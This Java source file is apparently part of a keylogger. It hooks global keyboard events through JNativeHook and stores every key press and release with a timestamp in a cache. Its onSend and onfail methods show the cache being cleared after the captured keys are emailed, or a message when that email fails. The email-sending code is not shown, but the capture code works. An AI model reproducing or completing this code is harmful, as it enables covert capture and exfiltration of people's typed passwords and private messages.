/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package KeyStrokes;

import java.util.ArrayList;
import java.util.List;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;
import Controllers.StoreKeyStrokes;

/**
 *
 * @author ahmed
 */
public class NativeKeyBoard implements NativeKeyListener {

    public static final List<StoreKeyStrokes> getKeyCache = null;

    private List<StoreKeyStrokes> keyCache = new ArrayList<>();
 
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyCache.add(new StoreKeyStrokes(e.getKeyCode(), true, System.currentTimeMillis()));
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + " KeyCode: " + e.getKeyCode());
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // TODO Auto-generated method stub
        keyCache.add(new StoreKeyStrokes(e.getKeyCode(), false, System.currentTimeMillis()));
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()) + " KeyCode: " + e.getKeyCode());
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()) + " KeyCode: " + e.getKeyCode());
    }

    public void onSend() {
        keyCache.clear();
    }

    public void onfail() {
        System.out.println("System could not send the Email!");
    }

    public List<StoreKeyStrokes> getKeyCache() {
        return keyCache;
    }
}
